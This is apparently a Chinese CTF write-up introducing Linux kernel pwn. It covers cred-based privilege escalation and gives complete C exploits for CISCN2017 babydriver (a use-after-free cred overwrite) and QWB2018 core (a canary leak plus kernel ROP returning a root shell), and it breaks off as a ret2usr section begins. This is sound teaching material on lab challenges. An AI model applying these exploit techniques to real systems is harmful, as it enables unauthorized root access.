---
title: 我的kernel pwn入门
description: CISCN2017 babydriver与2018强网杯core复现
date: 2021-11-11 14:10:55
categories:
 - kernel pwn
---



# 我的kernel pwn入门

## 一.linux内核漏洞利用预备知识

### 介绍

（1）ioctl ：用于与设备通信。int ioctl(int fd, unsigned long request, ...) 的第一个参数为打开设备 (open) 返回的文件描述符，第二个参数为用户程序对设备的控制命令，再后边的参数则是一些补充参数，与设备有关。

（2）struct cred：kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。

（3）内核态函数

​	    一个进程的在用户态和内核态是对应了完全不搭边儿的两个栈的，用户栈和内核栈既然相互隔离，在系统调用或者调用驱动、内核模块函数时就不能通过栈传参了，而要通过寄存器。

​	      printf() -> **printk()**   可用dmesg查看  

​	      memcpy() -> **copy_from_user()/copy_to_user()** 

​	      malloc() -> **kmalloc()**

​	      free() -> **kfree()**

（4）改变权限的函数：执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限（root 的 uid，gid 均为 0）。两个函数的地址都可以在 /proc/kallsyms 中查看（较老的内核版本中是 /proc/ksyms，/proc/kallsyms 的内容需要 root 权限才能查看）。

![image-20211111141506389](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111141506389.png)

（5）攻击方法

​	    内核pwn的攻击面其实仍然是用户态的那些传统攻击面，各种堆栈幺蛾子等等。流程上就是C程序exp调用内核模块利用其漏洞提权，只是提权后要“着陆”回用户态拿shell。提权代码是commit_creds(prepare_kernel_cred(0))。

（6）Mitigation缓解措施：

​    canary, dep, PIE, RELRO 等保护与用户态原理和作用相同

​    smep: Supervisor Mode Execution Protection，当处理器处于 ring0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)

​    smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。

### 进程权限管理

从源码角度来看为什么执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限

首先是内核中用task_struct来作为一个进程的描述符，该结构体定义于内核源码`include/linux/sched.h`中

![image-20211111142639374](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111142639374.png)

结构体定义太长，只关心下面几个参数

```c
/* Process credentials: */

/* Tracer's credentials at attach: */
const struct cred __rcu		*ptracer_cred;

/* Objective and real subjective task credentials (COW): */
const struct cred __rcu		*real_cred;

/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu		*cred;
```

**Process credentials** 是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 `cred` 结构体进行标识，对于一个进程而言应当有三个 cred：

- **ptracer_cred：**使用`ptrace`系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）
- **real_cred：**即**客体凭证**（**objective cred**），通常是一个进程最初启动时所具有的权限
- **cred：**即**主体凭证**（**subjective cred**），该进程的有效cred，kernel以此作为进程权限的凭证

一般情况下，主体凭证与客体凭证的值是相同的

> 例：当进程 A 向进程 B 发送消息时，A为主体，B为客体

#### 进程权限凭证：cred结构体

对于一个进程，在内核当中使用一个结构体`cred`管理其权限，该结构体定义于内核源码`include/linux/cred.h`中，如下：

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key	*session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	/* RCU deletion */
	union {
		int non_rcu;			/* Can we skip RCU deletion? */
		struct rcu_head	rcu;		/* RCU deletion hook */
	};
} __randomize_layout;
```

我们主要关注`cred`结构体中管理权限的变量

#### 用户ID & 组ID

一个cred结构体中记载了**一个进程四种不同的用户ID**：

- **真实用户ID**（real UID）：标识一个进程**启动时的用户ID**
- **保存用户ID**（saved UID）：标识一个进程**最初的有效用户ID**
- **有效用户ID**（effective UID）：标识一个进程**正在运行时所属的用户ID**，一个进程在运行途中是可以改变自己所属用户的，因而权限机制也是通过有效用户ID进行认证的，内核通过 euid 来进行特权判断；为了防止用户一直使用高权限，当任务完成之后，euid 会与 suid 进行交换，恢复进程的有效权限
- **文件系统用户ID**（UID for VFS ops）：标识一个进程**创建文件时进行标识的用户ID**

在通常情况下这几个ID应当都是相同的

用户组ID同样分为四个：`真实组ID`、`保存组ID`、`有效组ID`、`文件系统组ID`，与用户ID是类似的，这里便不再赘叙

#### 进程权限改变

前面我们讲到，一个进程的权限是由位于内核空间的`cred`结构体进行管理的，那么我们不难想到：只要改变一个进程的`cred`结构体，就能改变其执行权限

在内核空间有如下两个函数，都位于`kernel/cred.c`中：

- `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**
- `int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程

#### 提权

查看`prepare_kernel_cred()`函数源码，观察到如下逻辑：

```c
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
	const struct cred *old;
	struct cred *new;

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_kernel_cred() alloc %p", new);

	if (daemon)
		old = get_task_cred(daemon);
	else
		old = get_cred(&init_cred);
...
```

在`prepare_kernel_cred()`函数中，若传入的参数为NULL，则会缺省使用`init`进程的`cred`作为模板进行拷贝，**即可以直接获得一个标识着root权限的cred结构体**

那么我们不难想到，只要我们能够在内核空间执行`commit_creds(prepare_kernel_cred(NULL))`，那么就能够将当前进程的权限提升到`root`

## 二.状态切换

### user space to kernel space

当发生 `系统调用`，`产生异常`，`外设产生中断`等事件时，会发生用户态到内核态的切换，具体的过程为：

1. 通过 `swapgs` 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。

2. 将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。

3. 通过 push 保存各寄存器值，具体的代码如下:

   ```assembly
   ENTRY(entry_SYSCALL_64)
    /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
    SWAPGS_UNSAFE_STACK
      
    /* 保存栈值，并设置内核栈 */
    movq %rsp, PER_CPU_VAR(rsp_scratch)
    movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
      
      
   /* 通过push保存寄存器值，形成一个pt_regs结构 */
   /* Construct struct pt_regs on stack */
   pushq  $__USER_DS      /* pt_regs->ss */
   pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
   pushq  %r11             /* pt_regs->flags */
   pushq  $__USER_CS      /* pt_regs->cs */
   pushq  %rcx             /* pt_regs->ip */
   pushq  %rax             /* pt_regs->orig_ax */
   pushq  %rdi             /* pt_regs->di */
   pushq  %rsi             /* pt_regs->si */
   pushq  %rdx             /* pt_regs->dx */
   pushq  %rcx tuichu    /* pt_regs->cx */
   pushq  $-ENOSYS        /* pt_regs->ax */
   pushq  %r8              /* pt_regs->r8 */
   pushq  %r9              /* pt_regs->r9 */
   pushq  %r10             /* pt_regs->r10 */
   pushq  %r11             /* pt_regs->r11 */
   sub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */
   ```

4. 通过汇编指令判断是否为 x32_abi。

5. 通过系统调用号，跳到全局变量 `sys_call_table` 相应位置继续执行系统调用。

### kernel space to user space

退出时，流程如下：

1. 通过 `swapgs` 恢复 GS 值
2. 通过 `sysretq` 或者 `iretq` 恢复到用户控件继续执行。如果使用 `iretq` 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）

## 三.CTF kernel pwn 相关

一般会给以下三个文件

1. boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关
2. bzImage: kernel binary
3. rootfs.cpio: 文件系统映像
4. 本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag

## 四.CISCN2017 - babydriver

[题目](https://github.com/bash-c/pwn_repo/blob/master/CISCN/CISCN2017_babydriver/babydriver.tar)

解压得到三个文件

![image-20211111150522618](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111150522618.png)

然后将rootfs.cpio解压，看看有什么东西，可以先创建一个文件夹，将用rootfs.cpio改成rootfs.cpio.gz

```bash
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver$ mkdir core
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver$ cd core
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ mv ../rootfs.cpio rootfs.cpio.gz
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ gunzip rootfs.cpio.gz
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ ls
rootfs.cpio
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ cpio -idmv < rootfs.cpio 
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ ls
bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ cat init 
#!/bin/sh
 
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

根据 init 的内容，上面22 行加载了 `babydriver.ko` 这个驱动，根据 pwn 的一般套路，这个就是有漏洞的 LKM 了。init 的其他命令都是 linux 常用的命令

把这个驱动文件拿出来

![image-20211111152759120](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111152759120.png)

没有开 PIE，无 canary 保护，没有去除符号表

用 IDA 打开分析，既然没有去除符号表，shift + F9 先看一下有什么结构体，可以发现如下的结构体：

![image-20211111153710832](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111153710832.png)

再看一下主要函数

**babyioctl**：定义了 0x10001 的命令，可以释放全局变量 babydev_struct 中的 device_buf，再根据用户传递的 size 重新申请一块内存，并设置 device_buf_len。这里的v3是rdx也就是第三个参数，然后赋值给了v4，

![image-20211111153437401](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111153437401.png)

**babyopen:** 申请一块空间，大小为 0x40 字节，地址存储在全局变量 babydev_struct.device_buf 上，并更新 babydev_struct.device_buf_len

![image-20211111154350537](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111154350537.png)

这里的kmalloc_caches[6]用源码解释一下

kmalloc_caches[6]，这里下标6也就是对应了64的大小，具体可以看网上slab的介绍

```c
static void __init new_kmalloc_cache(int idx, unsigned long flags)
{
	kmalloc_caches[idx] = create_kmalloc_cache(kmalloc_info[idx].name,
					kmalloc_info[idx].size, flags);
}
```

```c
/*
 * kmalloc_info[] is to make slub_debug=,kmalloc-xx option work at boot time.
 * kmalloc_index() supports up to 2^26=64MB, so the final entry of the table is
 * kmalloc-67108864.
 */
static struct {   
	const char *name;
	unsigned long size;
}const kmalloc_info[] __initconst = {
	{NULL,                      0},		{"kmalloc-96",             96},
	{"kmalloc-192",           192},		{"kmalloc-8",               8},
	{"kmalloc-16",             16},		{"kmalloc-32",             32},
	{"kmalloc-64",             64},		{"kmalloc-128",           128},
	{"kmalloc-256",           256},		{"kmalloc-512",           512},
	{"kmalloc-1024",         1024},		{"kmalloc-2048",         2048},
	{"kmalloc-4096",         4096},		{"kmalloc-8192",         8192},
	{"kmalloc-16384",       16384},		{"kmalloc-32768",       32768},
	{"kmalloc-65536",       65536},		{"kmalloc-131072",     131072},
	{"kmalloc-262144",     262144},		{"kmalloc-524288",     524288},
	{"kmalloc-1048576",   1048576},		{"kmalloc-2097152",   2097152},
	{"kmalloc-4194304",   4194304},		{"kmalloc-8388608",   8388608},
	{"kmalloc-16777216", 16777216},		{"kmalloc-33554432", 33554432},
	{"kmalloc-67108864", 67108864}
};  /*一共25个*/
```

**babyread:** 先检查长度是否小于 babydev_struct.device_buf_len，然后把 babydev_struct.device_buf 中的数据拷贝到 buffer 中，buffer 和长度都是用户传递的参数，我这里的IDA反编译可能不清楚，原型是copy_to_user(buffer, babydev_struct.device_buf, v4);

![image-20211111160038549](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111160038549.png)

**babywrite:** 类似 babyread，不同的是从 buffer 拷贝到全局变量中，copy_from_user(babydev_struct.device_buf, buffer, v4);

![image-20211111160819528](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111160819528.png)

**babyrelease:** 释放空间

![image-20211111160930800](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111160930800.png)

还有 babydriver_init() 和 babydriver_exit() 两个函数分别完成了 **/dev/babydev** 设备的初始化和清理

### 思路

没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。

也就是说如果我们同时打开两个设备，第二次会覆盖第一次分配的空间，因为 babydev_struct 是全局的。同样，如果释放第一个，那么第二个其实是被是释放过得，这样就造成了一个 UAF。

那么有了 UAF 要怎么用呢？根据之前的分析，可以修改进程的 cred 结构。

其中 4.4.72 的 cred 结构体定义如下：

```c
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
#ifdef CONFIG_KEYS
	unsigned char	jit_keyring;	/* default keyring to attach requested
					 * keys to */
	struct key __rcu *session_keyring; /* keyring inherited over fork */
	struct key	*process_keyring; /* keyring private to this process */
	struct key	*thread_keyring; /* keyring private to this thread */
	struct key	*request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
	void		*security;	/* subjective LSM security */
#endif
	struct user_struct *user;	/* real user ID subscription */
	struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
	struct group_info *group_info;	/* supplementary groups for euid/fsgid */
	struct rcu_head	rcu;		/* RCU deletion hook */
};
```

那么根据 UAF 的思想，思路如下：

1. 打开两次设备，通过 ioctl 更改其大小为 cred 结构体的大小
2. 释放其中一个，fork 一个新进程，那么这个新进程的 cred 的空间就会和之前释放的空间重叠
3. 同时，我们可以通过另一个文件描述符对这块空间写，只需要将 uid，gid 改为 0，即可以实现提权到 root

需要确定 cred 结构体的大小，有了源码，大小就很好确定了。计算一下是 0x8a（注意使用相同内核版本的源码）。

### EXP

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>

int main()
{
	// 打开两次设备
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);

	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
	ioctl(fd1, 0x10001, 0x8a);

	// 释放 fd1
	close(fd1);

	// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
		char zeros[30] = {0};
		write(fd2, zeros, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	
	else
	{
		wait(NULL);
	}
	close(fd2);

	return 0;
}
```

### get root shell

```bash
// 静态编译文件，kernel 中没有 libc
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core/lib/modules/4.4.72$ gcc exp.c -static -o exp
// 把编译好的 exp 放到解压后的目录下，重新打包 rootfs.cpio
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core$ find . | cpio -o -H newc > ../rootfs.cpio 
7218 blocks
// kvm 需要有 root 权限
loeng@loeng-pwn:~/kernel/ciscn2017_babydriver/core/lib/modules/4.4.72$ sudo ./boot.sh
```

![image-20211111164818222](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111164818222.png)

成功提权（真TM折磨）

## 五.kernel ROP - 2018强网杯 - core

### 分析

题目给了 `bzImage`，`core.cpio`，`start.sh` 以及带符号表的 `vmlinux` 四个文件

前三个文件我们已经知道了作用，`vmlinux` 则是静态编译，未经过压缩的 kernel 文件，相对应的 `bzImage` 可以理解为压缩后的文件

vmlinux 未经过压缩，也就是说我们可以从 vmlinux 中找到一些 gadget，我们先把 gadget 保存下来备用。

```bash
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player/core$ ROPgadget --binary ./vmlinux > gadget
```

看一下start.sh

```bash
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player$ cat start.sh 
qemu-system-x86_64 \
-m 64M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s  \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
```

开了ksalr保护

解压core.cpio，看一下init

```bash
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

发现了几处有意思的地方：

- 第 9 行中把 `kallsyms` 的内容保存到了 `/tmp/kallsyms` 中，那么我们就能从 `/tmp/kallsyms` 中读取 `commit_creds`，`prepare_kernel_cred` 的函数的地址了
- 第 10 行把 `kptr_restrict` 设为 1，这样就不能通过 `/proc/kallsyms` 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了
- 第 11 行把 `dmesg_restrict` 设为 1，这样就不能通过 `dmesg` 查看 kernel 的信息了
- 第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包

可以直接用gen_cpio.sh打包

```bash
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player/core$ ./gen_cpio.sh core.cpio
```

然后就可以用start.sh运行起来了，如果报错就把-m 64M改大一点

```bash
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player$ ./start.sh 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
[    0.026295] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ lsmod
core 16384 0 - Live 0x0000000000000000 (O)
--------------------------------------------------
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player/core$ checksec core.ko
[*] '/home/loeng/kernel/qwb2018_core/give_to_player/core/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

用IDA将core.ko打开

**init_module()** 注册了 `/proc/core`

![image-20211111193932077](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111193932077.png)

**exit_core()** 删除 `/proc/core`

![image-20211111193949916](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111193949916.png)

**core_ioctl()** 定义了三条命令，分别调用 **core_read()**，**core_copy_func()** 和设置全局变量 **off**

![image-20211111194026506](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111194026506.png)

**core_read()** 从 `v4[off]` 拷贝 64 个字节到用户空间，但要注意的是全局变量 `off` 使我们能够控制的，因此可以合理的控制 `off` 来 leak canary 和一些地址

![image-20211111194621029](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111194621029.png)

**core_copy_func()** 从全局变量 `name` 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 `unsigned __int16`，但传递的长度是 `signed __int64`，因此如果控制传入的长度为 `0xffffffffffff0000|(0x100)` 等值，就可以栈溢出了

![image-20211111194757153](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111194757153.png)

**core_write()** 向全局变量 `name` 上写，这样通过 `core_write()` 和 `core_copy_func()` 就可以控制 ropchain 了

![image-20211111195116166](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111195116166.png)

### 思路

经过如上的分析，可以得出以下的思路：

1. 通过 ioctl 设置 off，然后通过 core_read() leak 出 canary
2. 通过 core_write() 向 name 写，构造 ropchain
3. 通过 core_copy_func() 从 name 向局部变量上写，通过设置合理的长度和 canary 进行 rop
4. 通过 rop 执行 `commit_creds(prepare_kernel_cred(0))`
5. 返回用户态，通过 system("/bin/sh”) 等起 shell

解释一下：

- 如何获得 commit_creds()，prepare_kernel_cred() 的地址？
  - /tmp/kallsyms 中保存了这些地址，可以直接读取，同时根据偏移固定也能确定 gadgets 的地址
- 如何返回用户态？
  - `swapgs; iretq`，之前说过需要设置 `cs, rflags` 等信息，可以写一个函数保存这些信息
  - 寻找包含`swapgs` 的gadget恢复 GS 值，再寻找一条包含`iretq`的gadget返回到用户空间。
  - `iret`指令在返回到用户空间是会依此从内核栈中弹出`rip`、`cs`、`EFLAGS`、`rsp`以及`ss`寄存器，因此需要也需要将这些数据部署正确，所以需要在开始覆盖之前保存相应的寄存器。保存数据的代码如下：

```c
// intel flavor assembly
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
           );
       puts("[*]status has been saved.");
}
// at&t flavor assembly
void save_stats() {
    asm(
    "movq %%cs, %0\n"
    "movq %%ss, %1\n"
    "movq %%rsp, %3"
    "pushfq\n"
    "popq %2\n"
    :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_sp)
    :
    : "memory"
    );
}
```

- Why bother returning to Userspace?
  - Most useful things we want to do are much easier from userland.
  - In KernelSpace, there’s no easy way to:
    - Modify the filesystem
    - Create a new process
    - Create network connections

### EXP-ROP

先说一下怎么调试，qemu 内置有 gdb 的接口，通过 help 查看

```bash
loeng@loeng-pwn:~/kernel/qwb2018_core/give_to_player$ qemu-system-x86_64 --help | grep gdb
-gdb dev        wait for gdb connection on 'dev'
-s              shorthand for -gdb tcp::1234
```

即可以通过 `-gdb tcp:port` 或者 `-s` 来开启调试端口，`start.sh` 中已经有了 `-s`，不必再自己设置。

另外通过 `gdb ./vmlinux` 启动时，虽然加载了 kernel 的符号表，但没有加载驱动 `core.ko` 的符号表，可以通过 `add-symbol-file core.ko textaddr` 加载，textaddr是core.ko加载地址，用cat /sys/module/core/sections/.text获取，查看需要 root 权限，因此为了方便调试，我们再改一下 `init`，

```shell
# setsid /bin/cttyhack setuidgid 1000 /bin/sh
setsid /bin/cttyhack setuidgid 0 /bin/sh
```

然后重新打包，这样启动就是root了

![image-20211111202446217](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211111202446217.png)

```bash
# qemu内
$ cat /sys/module/core/sections/.text 
0xffffffffc0187000

# qemu外
$ gdb ./vmlinux -q
pwndbg> add-sysbol-file ./core.ko 0xffffffffc0187000
pwndbg> b core_read
pwndbg> target remote localhost:1234
pwndbg> c

# qemu内
$ /tmp/exploit

# qemu外
pwndbg> c
	Breakpoint core_read
```

exp

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

void spawn_shell()
{
	if(!getuid())
	{
		system("/bin/sh");
	}
	else
	{
		puts("[*]spawn shell error!");
	}
	exit(0);
}

size_t commit_creds = 0, prepare_kernel_cred = 0;
size_t raw_vmlinux_base = 0xffffffff81000000;

size_t vmlinux_base = 0;
size_t find_symbols()
{
	FILE* kallsyms_fd = fopen("/tmp/kallsyms","r");

	if(kallsyms_fd < 0)
	{
		puts("[*]open kallsyms error!");
		exit(0);
	}

	char buf[0x30] = {0};
	while(fgets(buf,0x30,kallsyms_fd))
	{
		if(commit_creds & prepare_kernel_cred)
			return 0;

		if(strstr(buf, "commit_creds") && !commit_creds)
		{
			char hex[20] = {0};
			strncpy(hex,buf,16);
			sscanf(hex,"%llx",&commit_creds);
			printf("commit_creds addr: %p\n",commit_creds);
			vmlinux_base = commit_creds - 0x9c8e0;
			printf("vmlinux_base addr: %p",vmlinux_base);
		}

		if(strstr(buf, "prepare_kernel_cred") && !prepare_kernel_cred)
		{
			char hex[20] = {0};
			strncpy(hex,buf,16);
			sscanf(hex,"%llx",&prepare_kernel_cred);
			printf("prepare_kernel_cred addr: %p",prepare_kernel_cred);
			vmlinux_base = prepare_kernel_cred - 0x9cce0;
		}
	}

	if(!(prepare_kernel_cred & commit_creds))
	{
		puts("[*]Error!");
		exit(0);
	}
}
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
	__asm__(
		"mov user_cs, cs;"
		"mov user_sp, rsp;"
		"mov user_ss, ss;"
		"pushf;"
		"pop user_rflags;"
		);
	puts("[*]status has been saved.");
}

void set_off(int fd, long long idx)
{
	printf("[*]set off to %ld\n",idx);
	ioctl(fd,0x6677889C,idx);
}

void core_read(int fd,char *buf)
{
	puts("[*]read to buf.");
	ioctl(fd,0x6677889B,buf);
}

void core_copy_func(int fd,long long size)
{
	printf("[*]copy from user with size: %ld\n",size);
	ioctl(fd,0x6677889A,size);
}

int main(){
	save_status();
	int fd = open("/proc/core",2);
	if(fd < 0)
	{
		puts("[*]open /proc/core error!");
		exit(0);
	}

	find_symbols();

	ssize_t offset = vmlinux_base - raw_vmlinux_base;

	set_off(fd,0x40);

	char buf[0x40] = {0};
	core_read(fd,buf);
	size_t canary = ((size_t *)buf)[0];
	printf("[+]canary: %p\n", canary);

	size_t rop[0x1000] = {0};

	int i;
	for(i = 0;i < 10;i++)
	{
		rop[i] = canary;
	}
	rop[i++] = 0xffffffff81000b2f + offset;  //pop rdi ; ret
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)

	rop[i++] = 0xffffffff81021e53 + offset; //pop rcx ; ret
	rop[i++] = commit_creds;
	rop[i++] = 0xffffffff811ae978 + offset; //mov rdi, rax; jmp rcx

	rop[i++] = 0xffffffff81a012da + offset; //swapgs ; popfq ; ret
	rop[i++] = 0;
	rop[i++] = 0xffffffff81050ac2 + offset; //iretq ; ret

	rop[i++] = (size_t)spawn_shell; //rip
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	write(fd,rop,0x800);
	core_copy_func(fd,0xffffffffffff0000 | (0x100));

	return 0;
}
```

编译打包

```bash
gcc exp.c -static -masm=intel -g -o exp
```

然后QEMU运行

![image-20211114122536341](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20211114122536341.png)

提权成功

### EXP-ret2usr

这里先说一下ret2user的原理:
ret2usr 攻击利用了在没有开启SMEP（管理模式执行保护）的情况下，内核态CPU是可以访问执行用户空间的代码的。
